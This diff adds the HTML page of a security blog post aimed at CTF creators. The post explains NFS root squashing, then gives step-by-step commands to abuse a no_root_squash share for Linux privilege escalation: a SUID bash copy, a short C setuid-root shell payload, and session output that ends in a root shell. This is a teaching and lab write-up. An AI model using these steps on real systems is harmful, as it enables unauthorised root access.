@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Privilege Escalation - NFS Root Squashing for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-nfs-root-squashing/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Linux Privilege Escalation - NFS Root Squashing for CTF Creators">
+  <meta property="og:description" content="Shares can lead to root!">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:modified_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Nfs">
+    <meta property="article:tag" content="Root_squashing">
+    <meta property="article:tag" content="Defend">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Linux Privilege Escalation - NFS Root Squashing for CTF Creators">
+  <meta name="twitter:description" content="Shares can lead to root!">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-nfs-root-squashing/" /><link rel="prev" href="//localhost:1313/linux-privesc-open-shell-sessions/" /><link rel="next" href="//localhost:1313/linux-privesc-groups/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation - NFS Root Squashing for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/linux-privesc-nfs-root-squashing\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "privilege escalation, nfs, root_squashing, defend","wordcount":  495 ,
+        "url": "\/\/localhost:1313\/linux-privesc-nfs-root-squashing\/","datePublished": "2021-12-28T11:33:00+08:00","dateModified": "2021-12-28T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlopg"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - NFS Root Squashing for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlopg</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;495 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#nfs">NFS</a></li>
+    <li><a href="#privilege-escalation-via-nfs-root-squashing">Privilege Escalation via NFS Root Squashing</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="nfs">NFS</h1>
+<p>Root squash is an NFS feature that maps the remote root user (UID 0) to a local user with minimal privileges, typically the nobody user (UID 65534). This prevents remote root users from having root privileges on the NFS server, enhancing security.</p>
+<p>The NFS configuration file is <code>/etc/exports</code>. Here are the relevant options:</p>
+<ul>
+<li>
+<p>no_root_squash: This option disables root squash, allowing the root user on the client to access files on the NFS server as root. This can be risky, as it allows the creation of malicious files on the NFS share with root privileges.</p>
+</li>
+<li>
+<p>no_all_squash: This option is similar to no_root_squash but applies to non-root users, preventing their UIDs from being mapped to the nobody user.</p>
+</li>
+</ul>
+<h1 id="privilege-escalation-via-nfs-root-squashing">Privilege Escalation via NFS Root Squashing</h1>
+<p>On the victim machine we&rsquo;ll find the directory in which NFS is hosting files:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">cat /etc/exports
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On your adversary host, we&rsquo;ll install the NFS client package:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"> sudo apt install nfs-common
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In our adversary host, we&rsquo;ll create a directory to host the NFS share:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mkdir /tmp/nfs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In our adversary host, we will mount the remote share in the <code>/tmp/nfs</code> directory of our adversary host, make sure to run this command with sudo.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo mount -o rw,vers<span class="o">=</span><span class="m">2</span> 10.10.10.14:/tmp /tmp/nfs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The following error means that we don&rsquo;t have permission to mount the share, try it with sudo instead.</p>
+<blockquote>
+<p>mount.nfs: failed to apply fstab options</p>
+</blockquote>
+<p>The following error means that we need to try another protocol version.</p>
+<blockquote>
+<p>mount.nfs: Protocol not supported</p>
+</blockquote>
+<p>Alternatively, we can mount it this way:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo mount -t nfs 10.10.10.14:/tmp /tmp/nfs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we receive the error down by the user:</p>
+<blockquote>
+<p>mount: /tmp/nfs: bad option; for several file systems (e.g. nfs) we might need a /sbin/mount.</p>
+</blockquote>
+<p>This means that we don&rsquo;t have an NFS client installed:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo apt install nfs-common
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Once the share is mounted we can attempt to create a payload.</p>
+<p>We can create a bash binary with a SUID bit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo cp /bin/bash /tmp/nfs/bash <span class="o">&amp;&amp;</span> sudo chmod u+s /tmp/nfs/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Another payload that we can use is a custom C code:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setresuid</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">setuid</span><span class="p">(</span><span class="nf">getuid</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">system</span><span class="p">(</span><span class="s">&#34;/usr/bin/bash&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Compile this payload and remove any existing if any, then copy the payload to the share:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc payload.c -o payload <span class="o">&amp;&amp;</span> sudo rm /tmp/nfs/payload 2&gt;/dev/null<span class="p">;</span> sudo cp payload /tmp/nfs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the SUID bit to the payload executable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo chmod u+s /tmp/nfs/payload
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now in the victim host, we can execute any of the previous payloads to escalate privileges:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@pwn:/tmp$ ls -l
+</span></span><span class="line"><span class="cl">total <span class="m">1296</span>
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root <span class="m">1230280</span> Dec <span class="m">1</span> 09:03 bash
+</span></span><span class="line"><span class="cl">-rwsr-xr-x <span class="m">1</span> root root   <span class="m">16232</span> Dec <span class="m">1</span> 09:05 payload
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:/tmp$ ./bash -p
+</span></span><span class="line"><span class="cl">bash-5.1# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">bash-5.1# <span class="nb">exit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">user@pwn:/tmp$ ./payload 
+</span></span><span class="line"><span class="cl">root@pwn:/tmp# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1000</span> <span class="o">(</span>user<span class="o">)</span> &lt;...SNIP...&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Once we&rsquo;re done we can unmount the shared directory in our adversary host:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo umount /tmp/nfs
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-12-28</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/privilege-escalation/">Privilege Escalation</a>,&nbsp;<a href="/tags/nfs/">Nfs</a>,&nbsp;<a href="/tags/root_squashing/">Root_squashing</a>,&nbsp;<a href="/tags/defend/">Defend</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/linux-privesc-open-shell-sessions/" class="prev" rel="prev" title="Linux Privilege Escalation - Open Shell Sessions for CTF Creators"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Linux Privilege Escalation - Open Shell Sessions for CTF Creators</a>
+            <a href="/linux-privesc-groups/" class="next" rel="next" title="Linux Privilege Escalation - Groups for CTF Creators">Linux Privilege Escalation - Groups for CTF Creators<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.138.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":-1},"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
